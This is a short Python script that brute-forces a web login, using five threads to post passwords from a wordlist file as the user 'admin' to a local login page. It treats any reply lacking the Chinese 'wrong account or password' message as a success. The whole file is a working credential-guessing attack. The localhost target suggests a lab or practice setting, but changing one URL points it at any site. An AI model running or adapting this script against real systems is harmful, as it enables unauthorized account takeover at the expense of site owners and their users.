import requests
import queue
import threading
class attack(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue = queue
    def run(self):
        while not self._queue.empty():
            password=self._queue.get()
            try:
                self.check(password)
            except Exception as e:
                print(e)
    def check(self,password):
        url = "http://127.0.0.1:8231/index.php?s=login"
        data = {
            "username":"admin",
            "password":"%s"%(password),
        }
        r = requests.post(url,data=data)
        if '账号或密码错误' not in r.text:
            print('success')
            print(password)

if __name__ == "__main__":
	f=open('dict.txt','r')
	myqueue = queue.Queue()
	for i in f:
	    myqueue.put(i.strip('\n'))
	thread = []
	for i in range(0,5):
	    thread.append(attack(myqueue))
	for t in thread:
	    t.start()
	for j in thread:
	    j.join()